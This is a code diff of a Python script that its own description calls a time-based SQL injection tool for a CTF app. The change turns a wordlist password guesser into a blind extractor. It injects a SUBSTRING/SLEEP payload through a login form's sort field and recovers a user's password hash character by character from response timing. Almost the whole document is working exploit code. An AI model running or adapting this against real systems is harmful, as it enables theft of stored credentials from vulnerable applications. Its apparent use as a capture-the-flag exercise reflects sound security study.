@@ -5,10 +5,10 @@ import urllib.request
 from urllib.error import URLError
 
 
-def build_payload(username: str, password: str, delay: int) -> str:
+def build_payload(username: str, position: int, char: str, delay: int) -> str:
     return (
-        "created_at, IF((SELECT password_hash FROM users "
-        f"WHERE username='{username}') = SHA2('{password}', 256), "
+        "created_at, IF(SUBSTRING((SELECT password_hash FROM users "
+        f"WHERE username='{username}'), {position}, 1) = '{char}', "
         f"SLEEP({delay}), 1)"
     )
 
@@ -16,12 +16,13 @@ def build_payload(username: str, password: str, delay: int) -> str:
 def measure_delay(
     url: str,
     username: str,
-    password: str,
+    position: int,
+    char: str,
     delay: int,
     timeout: int,
     opener: urllib.request.OpenerDirector,
 ) -> float:
-    payload = build_payload(username, password, delay)
+    payload = build_payload(username, position, char, delay)
     data = urllib.parse.urlencode(
         {
             "username": "invalid",
@@ -36,31 +37,25 @@ def measure_delay(
     return time.monotonic() - start
 
 
-def attempt_login(
-    url: str, username: str, password: str, opener: urllib.request.OpenerDirector
-) -> bool:
-    data = urllib.parse.urlencode(
-        {
-            "username": username,
-            "password": password,
-            "sort": "created_at",
-        }
-    ).encode("utf-8")
-
-    with opener.open(url, data=data, timeout=10) as response:
-        body = response.read().decode("utf-8", errors="ignore")
-    return "Login successful" in body
-
-
 def main() -> None:
     parser = argparse.ArgumentParser(
-        description="Time-based SQLi wordlist probe for the CTF app"
+        description="Time-based SQLi hash extractor for the CTF app"
     )
     parser.add_argument("--base-url", default="http://127.0.0.1:5000")
     parser.add_argument("--username", default="clinician")
-    parser.add_argument("--wordlist", default="wordlist.txt")
     parser.add_argument("--delay", type=int, default=3)
     parser.add_argument("--threshold", type=float, default=2.5)
+    parser.add_argument(
+        "--length",
+        type=int,
+        default=64,
+        help="Expected hash length (SHA-256 hex is 64).",
+    )
+    parser.add_argument(
+        "--charset",
+        default="0123456789abcdef",
+        help="Character set to brute-force per hash position.",
+    )
     parser.add_argument(
         "--timeout",
         type=int,
@@ -95,16 +90,16 @@ def main() -> None:
             print(f"Preflight failed: {exc}. Is the app running on {login_url}?")
             return
 
-    with open(args.wordlist, "r", encoding="utf-8") as handle:
-        for line in handle:
-            candidate = line.strip()
-            if not candidate:
-                continue
+    extracted = []
+    for position in range(1, args.length + 1):
+        found = False
+        for char in args.charset:
             try:
                 elapsed = measure_delay(
                     login_url,
                     args.username,
-                    candidate,
+                    position,
+                    char,
                     args.delay,
                     args.timeout,
                     opener,
@@ -119,16 +114,24 @@ def main() -> None:
                     f"Request failed: {exc}. Check that the server is reachable."
                 )
                 return
-            print(f"Tried {candidate!r}: {elapsed:.2f}s")
+            print(
+                f"Position {position}/{args.length} char {char!r}: {elapsed:.2f}s"
+            )
             if elapsed >= args.threshold:
-                print(f"Potential password found: {candidate}")
-                if attempt_login(login_url, args.username, candidate, opener):
-                    print("Login succeeded with extracted password.")
-                else:
-                    print("Login did not succeed. Check threshold/delay.")
-                return
+                extracted.append(char)
+                print(
+                    f"Matched position {position}: {char} (hash so far: {''.join(extracted)})"
+                )
+                found = True
+                break
+        if not found:
+            print(
+                f"No match found at position {position}. Adjust --charset or timing."
+            )
+            return
 
-    print("No password found in wordlist.")
+    hash_value = "".join(extracted)
+    print(f"Extracted hash: {hash_value}")
 
 
 if __name__ == "__main__":
